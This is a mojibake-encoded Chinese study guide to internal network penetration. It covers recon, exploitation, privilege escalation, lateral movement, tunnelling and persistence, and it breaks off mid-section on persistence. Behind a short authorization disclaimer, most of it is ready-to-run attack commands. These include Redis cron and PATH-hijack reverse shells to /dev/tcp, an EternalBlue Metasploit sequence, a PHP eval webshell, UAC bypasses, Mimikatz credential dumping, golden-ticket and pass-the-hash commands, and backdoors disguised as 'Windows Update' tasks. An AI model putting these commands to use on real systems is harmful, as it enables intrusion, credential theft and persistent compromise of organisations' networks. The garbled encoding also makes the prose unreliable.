# å†…ç½‘æ¸—é€å®Œæ•´å­¦ä¹ æŒ‡å—

## ğŸ“‹ å­¦ä¹ è·¯çº¿å›¾

```
ç½‘ç»œåŸºç¡€(2å‘¨) â†’ ä¿¡æ¯æ”¶é›†(2å‘¨) â†’ æ¼æ´åˆ©ç”¨(3å‘¨) â†’ æƒé™æå‡(2å‘¨) â†’ æ¨ªå‘ç§»åŠ¨(3å‘¨) â†’ æŒä¹…åŒ–(1å‘¨) â†’ é˜²å¾¡å¯¹æŠ—(2å‘¨) â†’ å®æˆ˜æ¼”ç»ƒ(æŒç»­)
```

## âš–ï¸ æ³•å¾‹å£°æ˜ä¸é“å¾·å‡†åˆ™

> **ä¸¥æ­£å£°æ˜**: å†…ç½‘æ¸—é€å¿…é¡»åœ¨è·å¾—æ˜ç¡®ä¹¦é¢æˆæƒçš„å‰æä¸‹è¿›è¡Œï¼

### åˆæ³•ä½¿ç”¨åœºæ™¯
- âœ… ä¼ä¸šæˆæƒçš„å†…éƒ¨å®‰å…¨è¯„ä¼°
- âœ… çº¢è“å¯¹æŠ—æ¼”ç»ƒï¼ˆåŒæ–¹ç­¾ç½²æˆæƒåè®®ï¼‰
- âœ… å®‰å…¨ç«èµ›ä¸CTFç¯å¢ƒ
- âœ… è‡ªå»ºå®éªŒå®¤ç¯å¢ƒæµ‹è¯•

### ä¸¥æ ¼ç¦æ­¢
- âŒ æœªç»æˆæƒè®¿é—®ä»»ä½•å†…ç½‘ç³»ç»Ÿ
- âŒ çªƒå–ã€ç¯¡æ”¹ã€åˆ é™¤ä¼ä¸šæ•°æ®
- âŒ ç ´åç”Ÿäº§ç¯å¢ƒå’Œä¸šåŠ¡ç³»ç»Ÿ
- âŒ åˆ©ç”¨å†…ç½‘æ¼æ´è¿›è¡Œå‹’ç´¢ã€æ•²è¯ˆ

### æˆæƒæ–‡ä»¶å¿…å¤‡è¦ç´ 
- æ˜ç¡®çš„æµ‹è¯•èŒƒå›´å’ŒIPæ®µ
- æµ‹è¯•æ—¶é—´çª—å£
- ç¦æ­¢æ“ä½œæ¸…å•
- ç´§æ€¥è”ç³»äººå’Œåœæ­¢æœºåˆ¶
- åŒæ–¹ç­¾å­—ç›–ç« çš„æ­£å¼æ–‡ä»¶

---

## 1. åŸºç¡€çŸ¥è¯†ä½“ç³»

### 1.1 ç½‘ç»œåŸºç¡€æ·±å…¥

#### TCP/IPåè®®æ ˆ
**å››å±‚æ¨¡å‹**:
```
åº”ç”¨å±‚: HTTPã€DNSã€SMBã€RDPã€SSH
ä¼ è¾“å±‚: TCPã€UDP
ç½‘ç»œå±‚: IPã€ICMPã€ARP
é“¾è·¯å±‚: Ethernetã€VLAN
```

**å…³é”®åè®®ç‰¹æ€§**:
```python
# TCPä¸‰æ¬¡æ¡æ‰‹æµç¨‹
å®¢æˆ·ç«¯ -> [SYN] -> æœåŠ¡å™¨
å®¢æˆ·ç«¯ <- [SYN+ACK] <- æœåŠ¡å™¨
å®¢æˆ·ç«¯ -> [ACK] -> æœåŠ¡å™¨

# å†…ç½‘æ¸—é€ä¸­çš„åº”ç”¨
- ç«¯å£æ‰«æ: SYNæ‰«æã€ACKæ‰«æ
- é˜²ç«å¢™æ£€æµ‹: TCPæ ‡å¿—ä½æ“ä½œ
- éš§é“å»ºç«‹: TCPåå‘è¿æ¥
```

#### ç½‘ç»œæ‹“æ‰‘è¯†åˆ«

**å­ç½‘åˆ’åˆ†è®¡ç®—**:
```bash
# CIDRè¡¨ç¤ºæ³•
192.168.1.0/24    # 256ä¸ªIP (254å¯ç”¨)
10.0.0.0/8        # 16,777,216ä¸ªIP
172.16.0.0/16     # 65,536ä¸ªIP

# å­ç½‘æ©ç è®¡ç®—
/24 = 255.255.255.0
/16 = 255.255.0.0
/8  = 255.0.0.0
```

**ç½‘å…³å’Œè·¯ç”±å‘ç°**:
```bash
# Windows
route print
arp -a
ipconfig /all

# Linux
ip route
ip neigh
netstat -rn

# è¯†åˆ«å¤šç½‘å¡ä¸»æœºï¼ˆè·³æ¿æœºï¼‰
ip addr show
ifconfig -a
```

#### VLANä¸ç½‘æ®µéš”ç¦»

**VLANåŸç†**:
```
VLAN 10: è´¢åŠ¡éƒ¨é—¨ (172.16.10.0/24)
VLAN 20: ç ”å‘éƒ¨é—¨ (172.16.20.0/24)
VLAN 30: è¿ç»´éƒ¨é—¨ (172.16.30.0/24)
VLAN 99: ç®¡ç†VLAN (172.16.99.0/24)
```

**è·¨VLANæ”»å‡»æ–¹æ³•**:
```bash
# VLAN Hopping (åŒé‡æ ‡ç­¾)
# åˆ©ç”¨Trunkç«¯å£é…ç½®é”™è¯¯
# é€šè¿‡è·¯ç”±å™¨/ä¸‰å±‚äº¤æ¢æœº
# å¯»æ‰¾å¤šç½‘å¡ä¸»æœºä½œä¸ºè·³æ¿
```

### 1.2 æ“ä½œç³»ç»ŸåŸºç¡€

#### Windowså†…æ ¸æœºåˆ¶

**æ ¸å¿ƒç»„ä»¶**:
```
User Mode (ç”¨æˆ·æ€):
â”œâ”€â”€ Win32 åº”ç”¨ç¨‹åº
â”œâ”€â”€ Windowså­ç³»ç»Ÿ
â””â”€â”€ POSIXå­ç³»ç»Ÿ

Kernel Mode (å†…æ ¸æ€):
â”œâ”€â”€ Executive (æ‰§è¡Œä½“)
â”œâ”€â”€ Kernel (å†…æ ¸)
â”œâ”€â”€ Hardware Abstraction Layer (HAL)
â””â”€â”€ Device Drivers (è®¾å¤‡é©±åŠ¨)
```

**æƒé™æ¨¡å‹**:
```
æƒé™ç­‰çº§:
SYSTEM          # æœ€é«˜æƒé™
Administrator   # ç®¡ç†å‘˜
User            # æ™®é€šç”¨æˆ·
Guest           # è®¿å®¢

åŸŸç¯å¢ƒæƒé™:
Domain Admin            # åŸŸç®¡ç†å‘˜
Enterprise Admin        # ä¼ä¸šç®¡ç†å‘˜
Schema Admin           # æ¶æ„ç®¡ç†å‘˜
Domain User            # åŸŸç”¨æˆ·
```

**è¿›ç¨‹å’ŒæœåŠ¡**:
```powershell
# æŸ¥çœ‹è¿›ç¨‹
Get-Process
tasklist /v

# æŸ¥çœ‹æœåŠ¡
Get-Service
sc query

# æŸ¥çœ‹å¯åŠ¨é¡¹
Get-WmiObject Win32_StartupCommand
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

#### Linuxç³»ç»Ÿæ¶æ„

**ç›®å½•ç»“æ„**:
```
/bin        # åŸºæœ¬å‘½ä»¤
/sbin       # ç³»ç»Ÿç®¡ç†å‘½ä»¤
/etc        # é…ç½®æ–‡ä»¶
/var        # å¯å˜æ•°æ®ï¼ˆæ—¥å¿—ï¼‰
/tmp        # ä¸´æ—¶æ–‡ä»¶
/home       # ç”¨æˆ·ä¸»ç›®å½•
/root       # rootç”¨æˆ·ä¸»ç›®å½•
/usr        # ç”¨æˆ·ç¨‹åº
```

**æƒé™æ¨¡å‹**:
```bash
# æ–‡ä»¶æƒé™
rwxrwxrwx = 777
- æ‰€æœ‰è€… | ç»„ | å…¶ä»–ç”¨æˆ·

# ç‰¹æ®Šæƒé™
SUID (4000): ä»¥æ–‡ä»¶æ‰€æœ‰è€…èº«ä»½æ‰§è¡Œ
SGID (2000): ä»¥æ–‡ä»¶æ‰€å±ç»„èº«ä»½æ‰§è¡Œ
Sticky Bit (1000): ä»…æ‰€æœ‰è€…å¯åˆ é™¤

# æŸ¥çœ‹SUIDç¨‹åº
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

---

## 2. ä¿¡æ¯æ”¶é›†æŠ€æœ¯

### 2.1 ä¸»æœºå‘ç°

#### ICMPæ‰«æ
```bash
# Pingæ‰«æ
nmap -sn 192.168.1.0/24

# æ‰¹é‡pingï¼ˆWindowsï¼‰
for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find "TTL="

# æ‰¹é‡pingï¼ˆLinuxï¼‰
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "64 bytes" & done
```

#### ARPæ‰«æ
```bash
# Nmap ARPæ‰«æï¼ˆæœ¬åœ°ç½‘æ®µï¼‰
nmap -PR 192.168.1.0/24

# arp-scanå·¥å…·
arp-scan -l
arp-scan --interface=eth0 192.168.1.0/24

# NetDiscover
netdiscover -r 192.168.1.0/24 -i eth0

# æ‰‹å·¥ARPè¯·æ±‚
arping -c 3 192.168.1.1
```

#### TCP/UDPç«¯å£æ‰«æ

**å¸¸è§å†…ç½‘æœåŠ¡ç«¯å£**:
```
21    - FTP
22    - SSH
23    - Telnet
25    - SMTP
53    - DNS
80    - HTTP
88    - Kerberos
135   - MS RPC
139   - NetBIOS
389   - LDAP
443   - HTTPS
445   - SMB
1433  - MSSQL
1521  - Oracle
3306  - MySQL
3389  - RDP
5432  - PostgreSQL
5900  - VNC
6379  - Redis
8080  - HTTP Proxy
27017 - MongoDB
```

**å¿«é€Ÿæ‰«æç­–ç•¥**:
```bash
# å¿«é€Ÿæ‰«æå¸¸ç”¨ç«¯å£
nmap -p 21,22,23,80,443,445,3389,3306,1433 192.168.1.0/24 -T4 --open

# å…¨ç«¯å£æ‰«æ
masscan -p1-65535 192.168.1.0/24 --rate=10000

# Top 1000ç«¯å£
nmap -sS --top-ports 1000 192.168.1.0/24

# UDPæœåŠ¡æ‰«æ
nmap -sU -p 53,161,162,500 192.168.1.0/24
```

### 2.2 ç«¯å£æœåŠ¡æ‰«æ

#### Nmapé«˜çº§æŠ€å·§

**è„šæœ¬å¼•æ“ï¼ˆNSEï¼‰**:
```bash
# æ¼æ´æ‰«æ
nmap --script=vuln 192.168.1.10

# SMBæ¼æ´æ£€æµ‹
nmap -p 445 --script smb-vuln-* 192.168.1.10

# å¼±å¯†ç çˆ†ç ´
nmap -p 22 --script ssh-brute 192.168.1.10
nmap -p 3306 --script mysql-brute 192.168.1.10

# ä¿¡æ¯æ³„éœ²
nmap -p 80 --script http-enum 192.168.1.10
nmap -p 445 --script smb-enum-shares 192.168.1.10

# è¯¦ç»†æœåŠ¡è¯†åˆ«
nmap -sV -p- --version-all 192.168.1.10
```

**æ“ä½œç³»ç»ŸæŒ‡çº¹è¯†åˆ«**:
```bash
# OSæ£€æµ‹
nmap -O 192.168.1.10

# è¯¦ç»†OSä¿¡æ¯
nmap -A 192.168.1.10

# TTLå€¼åˆ¤æ–­
# 64  - Linux
# 128 - Windows
# 255 - ç½‘ç»œè®¾å¤‡
```

### 2.3 åŸŸç¯å¢ƒä¿¡æ¯æ”¶é›†

#### åŸŸæ§åˆ¶å™¨å®šä½

**DNSæŸ¥è¯¢æ–¹æ³•**:
```bash
# æŸ¥è¯¢åŸŸæ§åˆ¶å™¨
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.com

# æŸ¥è¯¢æ‰€æœ‰DC
nltest /dclist:domain.com

# æŸ¥è¯¢ä¸»åŸŸæ§
nltest /dsgetdc:domain.com

# PowerShellæŸ¥è¯¢
Get-ADDomainController -Filter *
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
```

**NetBIOSæŸ¥è¯¢**:
```bash
# æŸ¥è¯¢åŸŸæ§
net group "Domain Controllers" /domain

# æŸ¥è¯¢åŸŸä¿¡æ¯
net view /domain
net view /domain:WORKGROUP
```

#### åŸŸç”¨æˆ·æšä¸¾

**LDAPæŸ¥è¯¢**:
```bash
# æšä¸¾æ‰€æœ‰ç”¨æˆ·
ldapsearch -x -h dc.domain.com -b "dc=domain,dc=com" "(objectClass=user)"

# æŸ¥è¯¢ç®¡ç†å‘˜ç»„
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# PowerViewæšä¸¾
Get-NetUser
Get-NetUser -AdminCount
Get-NetGroup "Domain Admins"
```

**Kerberosæšä¸¾**:
```bash
# ç”¨æˆ·åæšä¸¾ï¼ˆAS-REP Roastingï¼‰
GetNPUsers.py domain.com/ -dc-ip 192.168.1.10 -request

# æœåŠ¡è´¦æˆ·æšä¸¾
GetUserSPNs.py -request -dc-ip 192.168.1.10 domain.com/user:password
```

#### åŸŸä¿¡ä»»å…³ç³»åˆ†æ

```powershell
# æŸ¥è¯¢ä¿¡ä»»å…³ç³»
nltest /domain_trusts
Get-ADTrust -Filter *

# æŸ¥è¯¢æ—ä¿¡ä»»
Get-ADForest | Select-Object Domains

# æšä¸¾è·¨åŸŸæƒé™
Find-ForeignUser
Find-ForeignGroup
```

#### GPOç­–ç•¥æ”¶é›†

```powershell
# æšä¸¾æ‰€æœ‰GPO
Get-GPO -All

# æŸ¥æ‰¾GPOä¸­çš„å¯†ç 
Get-GPPPassword

# æŸ¥è¯¢åº”ç”¨çš„GPO
gpresult /R
gpresult /H report.html

# å¯¼å‡ºGPOé…ç½®
Get-GPOReport -All -ReportType HTML -Path gpo_report.html
```

---

## 3. æ¼æ´å‘ç°ä¸åˆ©ç”¨

### 3.1 å†…ç½‘Webåº”ç”¨æ¼æ´

**å†…ç½‘åº”ç”¨ç‰¹ç‚¹**:
```
- å®‰å…¨é˜²æŠ¤è¾ƒå¼±ï¼ˆæ— WAFï¼‰
- å­˜åœ¨é»˜è®¤å¯†ç 
- ç‰ˆæœ¬é™ˆæ—§æœªæ‰“è¡¥ä¸
- å¼€å‘æµ‹è¯•ç¯å¢ƒæš´éœ²
```

**å¸¸è§æ¼æ´**:
```bash
# æœªæˆæƒè®¿é—®
JenkinsæœªæˆæƒRCE
Tomcat Managerå¼±å¯†ç 
phpMyAdminé»˜è®¤å¯†ç 

# é…ç½®é”™è¯¯
.gitç›®å½•æ³„éœ²
.svnç›®å½•æ³„éœ²
å¤‡ä»½æ–‡ä»¶æ³„éœ²ï¼ˆ.bak, .old, .zipï¼‰

# æ¡†æ¶æ¼æ´
Struts2 RCE
Weblogicååºåˆ—åŒ–
ThinkPHP RCE
```

### 3.2 ç³»ç»ŸæœåŠ¡æ¼æ´åˆ©ç”¨

#### SMBæ¼æ´åˆ©ç”¨

**EternalBlue (MS17-010)**:
```bash
# æ¼æ´æ£€æµ‹
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10

# Metasploitåˆ©ç”¨
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit
```

**SMBä¸­ç»§æ”»å‡»**:
```bash
# Responderæ•è·å“ˆå¸Œ
responder -I eth0 -wrf

# ntlmrelayxä¸­ç»§
ntlmrelayx.py -t 192.168.1.20 -smb2support

# MultiRelayé…ç½®
python MultiRelay.py -t 192.168.1.20 -u ALL
```

#### RDPæ¼æ´åˆ©ç”¨

**BlueKeep (CVE-2019-0708)**:
```bash
# æ¼æ´æ‰«æ
nmap -p 3389 --script rdp-vuln-ms12-020 192.168.1.0/24

# Metasploitæ£€æµ‹
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS 192.168.1.0/24
run

# æš´åŠ›ç ´è§£
crowbar -b rdp -s 192.168.1.10/32 -u admin -C passwords.txt
hydra -l administrator -P passwords.txt rdp://192.168.1.10
```

#### SSHæ¼æ´åˆ©ç”¨

**å¼±å¯†ç çˆ†ç ´**:
```bash
# Hydraçˆ†ç ´
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# Medusaçˆ†ç ´
medusa -h 192.168.1.10 -u root -P passwords.txt -M ssh

# å­—å…¸ç”Ÿæˆ
cewl http://company.com -w wordlist.txt
crunch 8 12 -t root%%%% -o passwords.txt
```

**SSHå¯†é’¥çªƒå–**:
```bash
# æŸ¥æ‰¾ç§é’¥
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find /home -name authorized_keys 2>/dev/null

# ä½¿ç”¨çªƒå–çš„å¯†é’¥
chmod 600 id_rsa
ssh -i id_rsa user@192.168.1.10
```

#### æ•°æ®åº“æœåŠ¡æ¼æ´

**MySQLææƒ**:
```sql
-- UDFææƒ
CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf.dll';
SELECT sys_exec('whoami');

-- æ—¥å¿—å†™å…¥Webshell
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = 'C:/inetpub/wwwroot/shell.php';
SELECT '<?php eval($_POST["cmd"]); ?>';
```

**MSSQLåˆ©ç”¨**:
```sql
-- xp_cmdshellæ‰§è¡Œå‘½ä»¤
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- OLE Automationæ‰§è¡Œ
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'run', NULL, 'cmd.exe /c whoami';
```

**Redisæœªæˆæƒè®¿é—®**:
```bash
# å†™å…¥SSHå…¬é’¥
redis-cli -h 192.168.1.10
config set dir /root/.ssh
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n"
save

# å†™å…¥Crontab
config set dir /var/spool/cron
config set dbfilename root
set x "\n* * * * * bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\n"
save
```

---

## 4. æƒé™æå‡

### 4.1 Windowsæƒé™æå‡

#### UACç»•è¿‡

**å¸¸ç”¨æ–¹æ³•**:
```powershell
# eventvwr.exeç»•è¿‡ï¼ˆé€‚ç”¨äºWin7-Win10ï¼‰
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "cmd.exe /c powershell.exe" -Force
Start-Process "eventvwr.exe"

# fodhelper.exeç»•è¿‡ï¼ˆWin10ï¼‰
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c powershell.exe" -Force
Start-Process "fodhelper.exe"
```

#### æœåŠ¡æƒé™æ»¥ç”¨

**ä¸å®‰å…¨æœåŠ¡æƒé™**:
```powershell
# æšä¸¾å¯ä¿®æ”¹çš„æœåŠ¡
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService

# PowerUpæšä¸¾
Invoke-AllChecks

# åˆ©ç”¨unquotedæœåŠ¡è·¯å¾„
# æœåŠ¡è·¯å¾„: C:\Program Files\Some Service\service.exe
# å°è¯•åˆ›å»º: C:\Program.exe æˆ– C:\Program Files\Some.exe

# åˆ©ç”¨å¯å†™æœåŠ¡äºŒè¿›åˆ¶
sc qc vulnerable_service
icacls "C:\path\to\service.exe"
# æ›¿æ¢æœåŠ¡äºŒè¿›åˆ¶ä¸ºæ¶æ„ç¨‹åº
```

#### Tokençªƒå–

**Tokenæ“ä½œ**:
```powershell
# åˆ—ä¸¾è¿›ç¨‹Token
Invoke-TokenManipulation -Enumerate

# çªƒå–SYSTEM Token
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"

# ä½¿ç”¨Incognitoï¼ˆMeterpreterï¼‰
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
```

#### å†…æ ¸æ¼æ´åˆ©ç”¨

**å¸¸è§å†…æ ¸ææƒæ¼æ´**:
```bash
# MS16-032ï¼ˆWin7/8/10ï¼‰
Invoke-MS16032

# MS15-051ï¼ˆWin7/8/Server 2008/2012ï¼‰
use exploit/windows/local/ms15_051_client_copy_image

# MS14-058ï¼ˆWin7/8/Server 2008/2012ï¼‰
use exploit/windows/local/ms14_058_track_popup_menu

# è‡ªåŠ¨åŒ–æšä¸¾
./windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt
```

### 4.2 Linuxæƒé™æå‡

#### SUID/SGIDæ»¥ç”¨

**æŸ¥æ‰¾SUIDç¨‹åº**:
```bash
# æŸ¥æ‰¾æ‰€æœ‰SUIDç¨‹åº
find / -perm -4000 -type f 2>/dev/null

# å¸¸è§å¯åˆ©ç”¨çš„SUIDç¨‹åº
find / -name vim* -exec ls -l {} \; 2>/dev/null
find / -name nmap* -exec ls -l {} \; 2>/dev/null
find / -name python* -exec ls -l {} \; 2>/dev/null
```

**åˆ©ç”¨ç¤ºä¾‹**:
```bash
# vimææƒ
vim -c ':!/bin/bash'

# nmapææƒï¼ˆæ—§ç‰ˆæœ¬ï¼‰
nmap --interactive
!sh

# findææƒ
find /home -exec /bin/bash \;

# pythonææƒ
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### å®šæ—¶ä»»åŠ¡åŠ«æŒ

```bash
# æŸ¥æ‰¾å¯å†™çš„cronä»»åŠ¡
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# æŸ¥æ‰¾å¯å†™çš„è„šæœ¬
find /etc/cron* -type f -perm -o+w 2>/dev/null

# åˆ©ç”¨PATHåŠ«æŒ
# åœ¨è„šæœ¬ä¸­åˆ›å»ºæ¶æ„åŒåå‘½ä»¤
echo -e '#!/bin/bash\n/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' > /tmp/ps
chmod +x /tmp/ps
export PATH=/tmp:$PATH
```

#### å†…æ ¸æ¼æ´åˆ©ç”¨

**è„ç‰›ï¼ˆDirty COWï¼‰**:
```bash
# CVE-2016-5195æ£€æµ‹
uname -a
cat /etc/issue

# ç¼–è¯‘åˆ©ç”¨
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password

# åˆ©ç”¨å
su firefart  # å¯†ç : password
```

**å¸¸ç”¨ææƒå·¥å…·**:
```bash
# LinEnum
./LinEnum.sh

# linpeas
./linpeas.sh

# linux-exploit-suggester
./linux-exploit-suggester.sh

# BeRoot
python beroot.py
```

---

## 5. æ¨ªå‘ç§»åŠ¨æŠ€æœ¯

### 5.1 å‡­è¯è·å–

#### Windowså¯†ç å“ˆå¸Œæå–

**Mimikatz**:
```powershell
# ææƒåˆ°SYSTEM
privilege::debug
token::elevate

# æå–æ˜æ–‡å¯†ç 
sekurlsa::logonpasswords

# æå–å“ˆå¸Œ
lsadump::sam
lsadump::secrets

# æå–Kerberosç¥¨æ®
sekurlsa::tickets /export

# é»„é‡‘ç¥¨æ®
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:hash /ptt

# ç™½é“¶ç¥¨æ®
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:hash /ptt
```

**Procdump + Mimikatz**:
```bash
# 1. ä½¿ç”¨Procdumpå¯¼å‡ºlsass
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# 2. ç¦»çº¿è§£æ
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

**LaZagne**:
```bash
# æå–æ‰€æœ‰å¯†ç 
laZagne.exe all

# æå–æµè§ˆå™¨å¯†ç 
laZagne.exe browsers

# æå–ç³»ç»Ÿå¯†ç 
laZagne.exe sysadmin
```

#### Kerberosæ”»å‡»

**Kerberoasting**:
```powershell
# è¯·æ±‚æœåŠ¡ç¥¨æ®
Get-DomainUser -SPN
Request-SPNTicket -SPN "MSSQLSvc/server.domain.com:1433"

# å¯¼å‡ºç¥¨æ®
Invoke-Mimikatz -Command '"kerberos::list /export"'

# ç¦»çº¿ç ´è§£
python tgsrepcrack.py wordlist.txt ticket.kirbi
hashcat -m 13100 ticket.hash wordlist.txt
```

**AS-REP Roasting**:
```bash
# æšä¸¾ä¸éœ€è¦é¢„è®¤è¯çš„ç”¨æˆ·
Get-DomainUser -PreauthNotRequired

# è¯·æ±‚AS-REP
GetNPUsers.py domain.com/ -dc-ip 192.168.1.10 -request

# ç ´è§£å“ˆå¸Œ
hashcat -m 18200 asrep.hash wordlist.txt
```

#### æµè§ˆå™¨å¯†ç æå–

```powershell
# Chromeå¯†ç æå–
$loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
# è§£å¯†éœ€è¦ç”¨æˆ·DPAPIå¯†é’¥

# Firefoxå¯†ç æå–
# æŸ¥æ‰¾key4.dbå’Œlogins.json

# Edgeå¯†ç 
$edgeData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
```

### 5.2 æ¨ªå‘ç§»åŠ¨æŠ€æœ¯

#### PsExec

```bash
# å®˜æ–¹PsExec
PsExec.exe \\192.168.1.10 -u domain\admin -p password cmd.exe

# Metasploit PsExec
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser admin
set SMBPass password
exploit

# Impacket PsExec
psexec.py domain/admin:password@192.168.1.10
```

#### WMIè¿œç¨‹æ‰§è¡Œ

```powershell
# PowerShell WMI
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c calc.exe" -ComputerName 192.168.1.10 -Credential $cred

# WMICå‘½ä»¤
wmic /node:192.168.1.10 /user:domain\admin /password:password process call create "cmd.exe /c calc.exe"

# Impacket wmiexec
wmiexec.py domain/admin:password@192.168.1.10
```

#### PowerShell Remoting

```powershell
# å¯ç”¨PSRemoting
Enable-PSRemoting -Force

# è¿œç¨‹æ‰§è¡Œå‘½ä»¤
Invoke-Command -ComputerName 192.168.1.10 -Credential domain\admin -ScriptBlock {whoami}

# è¿›å…¥äº¤äº’å¼ä¼šè¯
Enter-PSSession -ComputerName 192.168.1.10 -Credential domain\admin

# æ‰¹é‡æ‰§è¡Œ
Invoke-Command -ComputerName 192.168.1.10,192.168.1.11 -ScriptBlock {Get-Process}
```

#### Pass-the-Hashæ”»å‡»

```bash
# Mimikatz PTH
sekurlsa::pth /user:admin /domain:domain.com /ntlm:hash /run:cmd.exe

# Impacket PTH
psexec.py -hashes :ntlmhash domain/admin@192.168.1.10
wmiexec.py -hashes :ntlmhash domain/admin@192.168.1.10
smbexec.py -hashes :ntlmhash domain/admin@192.168.1.10
```

### 5.3 éš§é“æŠ€æœ¯

#### SSHéš§é“

**æœ¬åœ°ç«¯å£è½¬å‘**:
```bash
# è®¿é—®å†…ç½‘æœåŠ¡
ssh -L 8080:192.168.1.10:80 user@jump-server
# æœ¬åœ°è®¿é—® http://localhost:8080

# è®¿é—®å†…ç½‘æ•°æ®åº“
ssh -L 3306:192.168.1.20:3306 user@jump-server
mysql -h 127.0.0.1 -P 3306 -u root -p
```

**è¿œç¨‹ç«¯å£è½¬å‘**:
```bash
# å°†å†…ç½‘æœåŠ¡æš´éœ²åˆ°å…¬ç½‘
ssh -R 8080:localhost:80 user@public-server
# å…¬ç½‘è®¿é—® http://public-server:8080

# åå‘Shell
ssh -R 4444:localhost:22 user@attacker-server
```

**åŠ¨æ€ç«¯å£è½¬å‘ï¼ˆSOCKSä»£ç†ï¼‰**:
```bash
# åˆ›å»ºSOCKSä»£ç†
ssh -D 1080 user@jump-server

# é…åˆproxychainsä½¿ç”¨
proxychains nmap -sT 192.168.1.0/24
proxychains firefox
```

#### HTTP/HTTPSéš§é“

**reGeorg**:
```bash
# 1. ä¸Šä¼ tunnelè„šæœ¬ï¼ˆtunnel.aspx/jsp/phpï¼‰
# 2. å¯åŠ¨ä»£ç†
python reGeorgSocksProxy.py -u http://target.com/tunnel.aspx -p 1080

# 3. ä½¿ç”¨ä»£ç†
proxychains curl http://192.168.1.10
```

**Neo-reGeorgï¼ˆåŠ å¯†ç‰ˆï¼‰**:
```bash
# ç”ŸæˆåŠ å¯†éš§é“
python neoreg.py generate -k password

# å¯åŠ¨å®¢æˆ·ç«¯
python neoreg.py -k password -u http://target.com/tunnel.php
```

#### DNSéš§é“

**dnscat2**:
```bash
# æœåŠ¡ç«¯
dnscat2-server domain.com

# å®¢æˆ·ç«¯ï¼ˆWindowsï¼‰
dnscat2.exe domain.com

# å®¢æˆ·ç«¯ï¼ˆLinuxï¼‰
./dnscat domain.com
```

**iodine**:
```bash
# æœåŠ¡ç«¯
iodined -f -P password 10.0.0.1 tunnel.domain.com

# å®¢æˆ·ç«¯
iodine -f -P password tunnel.domain.com
```

#### ç«¯å£è½¬å‘å·¥å…·

**Chisel**:
```bash
# æœåŠ¡ç«¯
chisel server -p 8000 --reverse

# å®¢æˆ·ç«¯ï¼ˆæ­£å‘ä»£ç†ï¼‰
chisel client server-ip:8000 8080:192.168.1.10:80

# å®¢æˆ·ç«¯ï¼ˆåå‘ä»£ç†ï¼‰
chisel client server-ip:8000 R:socks
```

**Frp**:
```ini
# frps.iniï¼ˆæœåŠ¡ç«¯ï¼‰
[common]
bind_port = 7000

# frpc.iniï¼ˆå®¢æˆ·ç«¯ï¼‰
[common]
server_addr = server-ip
server_port = 7000

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 6000
```

---

## 6. æŒä¹…åŒ–æœºåˆ¶

### 6.1 WindowsæŒä¹…åŒ–

#### æ³¨å†Œè¡¨å¯åŠ¨é¡¹

```powershell
# Runé”®
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f

# RunOnceé”®
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f

# Winlogon
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\backdoor.exe" /f
```

#### è®¡åˆ’ä»»åŠ¡

```powershell
# åˆ›å»ºæ¯æ—¥ä»»åŠ¡
schtasks /create /tn "Windows Update" /tr "C:\backdoor.exe" /sc daily /st 09:00

# åˆ›å»ºç™»å½•è§¦å‘ä»»åŠ¡
schtasks /create /tn "SystemCheck" /tr "powershell.exe -enc <base64>" /sc onlogon /ru System

